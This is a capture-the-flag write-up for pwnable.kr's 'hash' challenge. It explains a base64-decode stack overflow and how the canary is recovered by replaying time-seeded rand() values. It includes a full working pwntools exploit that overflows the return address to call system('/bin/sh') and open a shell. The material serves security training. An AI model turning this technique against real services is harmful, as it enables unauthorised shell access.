>We made a simple MD5 calculator as a network service.
>Find a bug and exploit it to get a shell.
>hint : this service shares the same machine with pwnable.kr web service

NO pie
## understanding the challenge
did it with dolev. 
## vulnerability
buff overflow with the `base64_decode(g_buff, s)` each base64 char is converted to 6 bits or 3/4 of a byte. because `g_buff` size is 1024 and s size is 512 we get an overflow.

### goal
find the canary

`my_hash` returns a combination of random numbers with a leaked canary value.
dolev said that you could get the rand values if you're fast enough because if the seed is the same we will get the same values.

## implementation
1. call rand through python with the seed of the same as test.c
2. get a basic program in python2 with remote, debug, local options
3. leak the canary & check it 
4. overflow the ret to 0x08049187 and put on the stack `g_buff+overflow_len` because after the overflow we will input `/bin/sh`

## calculating the overflow
each char is 3/4 byte 

the distance from the plaintext to ret is: `4 (ebp) + 4 (edi) + 4 (ebx) 4 (canary) + 512 (pt) = 528`, 
if we look at the offset from the stack frame it's 524 then add 4 for `ebp`  **528** OK

we need to overflow `ebp` to be `/bin/sh` and RA (`ebp` + 4) to be 0x08049187
532 bytes after decoding. so `532 = 3/4 * X` so x is 709.33 say 710 + `/bin/sh` lets check my idea it was 712 because it rounded 710 with two `=`.
#### canary location
after the `pt` we get the `canary` so 512 bytes 
so now `512*x canary 12*x + system + /bin/sh`

# writeups
```python
from pwn import *
import sys, base64
from ctypes import CDLL
from math import floor
import time

context.log_level = 'info'
libc = CDLL("libc.so.6")


CALL_SYSTEM = 0x08049187
G_BUFF = 0x0804B0E0

def conn():
    
    if len(sys.argv) == 1 or sys.argv[1] == 'local':
        return process('./hash')
    elif sys.argv[1] == 'remote':
        return remote('pwnable.kr', 9002)
    elif sys.argv[1] == 'debug':
        return gdb.debug('./hash', gdbscript='''
                        b *0x08048EE5
                        b *0x08049077
                        continue
                         ''')
    if len(sys.argv) != 2:
        raise Exception('deadbeef')
    
p = conn()
now = int(floor(time.time()))

p.recvuntil(b': ')
captcha = int(p.recvline().decode())
p.sendline(str(captcha).encode())
# gets the canary
# v4 - v6 + v7 + canary + v2 - v3 + v1 + v5 = captcha 
libc.srand(now)
rands = [libc.rand() for _ in range(8)]
canary = (captcha - rands[4] + rands[6] - rands[7] - rands[2] + rands[3] - rands[1] - rands[5]) % 2**32
log.success("found canary {:x}".format(canary))

# BOF
payload = base64.b64encode(b'X'*512 + p32(canary) + b'X'*12 + p32(CALL_SYSTEM) + p32(G_BUFF+717))
payload += b'\x00/bin/sh\x00'
p.sendlineafter(b'Encode your data with BASE64 then paste me!\n', payload)
p.interactive()
```
this was fun. other writeups did the same.

## learning
* I should keep my critical thinking flow.
* I should keep my pre calculating to understand better my attack 